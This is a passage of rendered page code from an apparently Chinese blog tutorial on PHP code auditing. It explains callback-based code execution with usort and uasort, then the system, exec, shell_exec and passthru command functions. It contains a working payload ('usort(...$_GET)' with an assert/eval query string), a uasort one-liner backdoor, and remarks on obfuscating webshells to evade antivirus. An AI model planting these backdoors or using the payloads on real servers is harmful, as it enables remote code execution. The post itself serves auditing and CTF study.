punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"?"),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"1"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),":"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"1"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$onearray"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"1"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"3"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"2"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"5"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"9"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"usort"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$onearray"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'func'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"print_r"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$onearray"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n\n执行结果——>\nArray\n(\n    [0] => 9\n    [1] => 5\n    [2] => 3\n    [3] => 2\n    [4] => 1\n)"))),Object(p.b)("p",null,"可见实现了逆序的功能。那么倘若我们把回调函数设计成能够执行代码的函数，是不是就可以执行我们想要的代码了呢？"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php")," \n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"usort"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n\npayload: 1.php?1[0]=0&1[1]=eval($_POST['x'])&2=assert\nPOST传参: x=phpinfo();"))),Object(p.b)("p",null,Object(p.b)("inlineCode",{parentName:"p"},"usort"),"的参数通过GET传参，第一个参数也就是",Object(p.b)("inlineCode",{parentName:"p"},"$_GET[0]"),"，随便传入一个数字即可。第二个参数也就是",Object(p.b)("inlineCode",{parentName:"p"},"$_GET[1]"),"是我们要调用的函数名称，这里采用的是",Object(p.b)("inlineCode",{parentName:"p"},"assert"),"函数。"),Object(p.b)("p",null,"执行结果："),Object(p.b)("p",null,Object(p.b)("img",c({parentName:"p"},{src:"/images/20200819235236.png",alt:null}))),Object(p.b)("h3",{className:"__internal",id:"uasort"},"uasort()",Object(p.b)("a",c({parentName:"h3"},{href:"#uasort","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"这个跟上一个差不多，区别不是很大。此函数对数组排序并保持索引和单元之间的关联。也就是说你这个排完序之后呢，它原来对应的索引也会相应改变，类似于“绑定”。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"uasort"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"(")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"array")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"&"),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$array"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"callable")," ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$value_compare_func"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),":")," bool"))),Object(p.b)("h4",{className:"__internal",id:"参数-7"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-7","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"array：输入的数组"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"value_compare_func：用户自定义的函数")),Object(p.b)("p",null,"这里用的仍然官方例子（比较好理解）"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"// Comparison function"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"cmp"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$b"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"if")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"==")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$b"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"return")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"0"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"return")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"<")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$b"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"?")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"1")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),":")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"1"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\n",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"// Array to be sorted"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$array")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'a'")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"4"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'b'")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"8"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'c'")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"1"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'d'")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"9"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'e'")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"2"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'f'")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"5"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'g'")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"3"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'h'")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"4"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"print_r"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\n",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"// Sort and print the resulting array"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"uasort"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'cmp'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"print"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n       \n执行结果——>\nArray\n(\n    [a] => 4\n    [b] => 8\n    [c] => -1\n    [d] => -9\n    [e] => 2\n    [f] => 5\n    [g] => 3\n    [h] => -4\n)\nArray\n(\n    [d] => -9\n    [h] => -4\n    [c] => -1\n    [e] => 2\n    [g] => 3\n    [a] => 4\n    [f] => 5\n    [b] => 8\n)"))),Object(p.b)("p",null,"我们发现，在排完序之后索引也跟着值的位置变化而变化了。那么代码执行的示例代码其实也和上一个差不多。"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'a'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$onearray")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'Ameng'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_POST"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'x'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"uasort"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$onearray"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"执行结果："),Object(p.b)("p",null,Object(p.b)("img",c({parentName:"p"},{src:"/images/20200820001152.png",alt:null}))),Object(p.b)("h3",{className:"__internal",id:"总结"},"总结",Object(p.b)("a",c({parentName:"h3"},{href:"#%E6%80%BB%E7%BB%93","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"看完这里不知道你对代码审计中的代码执行部分是否有另一种想法？我的想法就是这个是和后门联系在一起的。我们可以看到很多函数都具有构造执行命令的条件，而且其中很多函数也的确被用在后门中，特别像后面几个回调函数，在后门中更是常见。当然这些后门函数也早已被安全厂商盯住，所以大部分已经无法直接免杀，所以想要免杀就需要结合其他姿势，比如替换、拼接、加密等等。但是这些知识在CTF中还是比较容易出现的。"),Object(p.b)("h2",{className:"__internal",id:"命令执行"},"命令执行",Object(p.b)("a",c({parentName:"h2"},{href:"#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"说完代码执行，我们再来看看命令执行。常见的命令执行函数有哪些呢？"),Object(p.b)("h3",{className:"__internal",id:"system"},"system()",Object(p.b)("a",c({parentName:"h3"},{href:"#system","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"这个函数想必我们都是比较熟悉的，此函数就是执行外部指令，并且显示输出"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"system"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"(")," string ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$command"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," int ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"&"),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$return_var"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),":")," string"))),Object(p.b)("h4",{className:"__internal",id:"参数-8"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-8","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"command：必需。要执行的命令"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"return_var：可选。若设置了这个参数，那么命令执行后的返回状态就会被放到这个变量中")),Object(p.b)("p",null,"示例代码："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$cmd")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'whoami'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"system"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$cmd"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n    \n执行结果——>\ndesktop-m61j5j6\\admin"))),Object(p.b)("h3",{className:"__internal",id:"exec"},"exec()",Object(p.b)("a",c({parentName:"h3"},{href:"#exec","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"这个其实和上面",Object(p.b)("inlineCode",{parentName:"p"},"system"),"函数没有太大区别，都是执行外部程序指令，只不过这个函数多了一个参数，可以让我们把命令执行输出的结果保存到一个数组中。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"exec"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"(")," string ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$command"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"array")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"&"),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$output"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," int ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"&"),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$return_var"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),":")," string"))),Object(p.b)("h4",{className:"__internal",id:"参数-9"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-9","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"command：必需。要执行的命令"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"output：可选。如果设置了此参数，那么命令执行的结果将会保存到此数组。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"return_var：可选。命令执行的返回状态。")),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$cmd")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'whoami'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"exec"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$cmd"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n\n执行结果——>\ndesktop-m61j5j6\\admin"))),Object(p.b)("h3",{className:"__internal",id:"shell_exec"},"shell_exec()",Object(p.b)("a",c({parentName:"h3"},{href:"#shell_exec","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"此函数通过shell环境执行命令，并且将完整的输出以字符串的方式返回。如果执行过程中发生错误或者进程不产生输出，那么就返回",Object(p.b)("inlineCode",{parentName:"p"},"NULL")),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"shell_exec"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"(")," string ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$cmd"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),":")," string"))),Object(p.b)("h4",{className:"__internal",id:"参数-10"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-10","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"cmd：要执行的命令")),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$cmd")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'whoami'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"shell_exec"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$cmd"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n    \n执行结果——>\ndesktop-m61j5j6\\admin"))),Object(p.b)("h3",{className:"__internal",id:"passthru"},"passthru()",Object(p.b)("a",c({parentName:"h3"},{href:"#passthru","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"执行外部程序并且显示原始输出。既然我们已经有执行命令的函数了，那么这个函数我们什么时候会用到呢？当所执行的Unix命令输出二进制数据，并且需要直接传送到浏览器的时候，需要用此函数来替代",Object(p.b)("inlineCode",{parentName:"p"},"exec()"),"或",Object(p.b)("inlineCode",{parentName:"p"},"system()"),"函数"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"passthru"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"(")," string ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$command"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," int ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"&"),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$return_var"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),":")," void"))),Object(p.b)("h4",{className:"__internal",id:"参数-11"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-11","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"command：要执行的命令"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"return_var：Unix命令的返回状态将被记录到此函数。")),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),"第一你可以这么写\n",Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"passthru"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'whoami'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\t",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//直接将结果返回到页面"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n第二你可以这么写\n",Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"passthru"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'whoami'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$result"),Object(p.b)("span",c({parentName:"span"},{className:"token 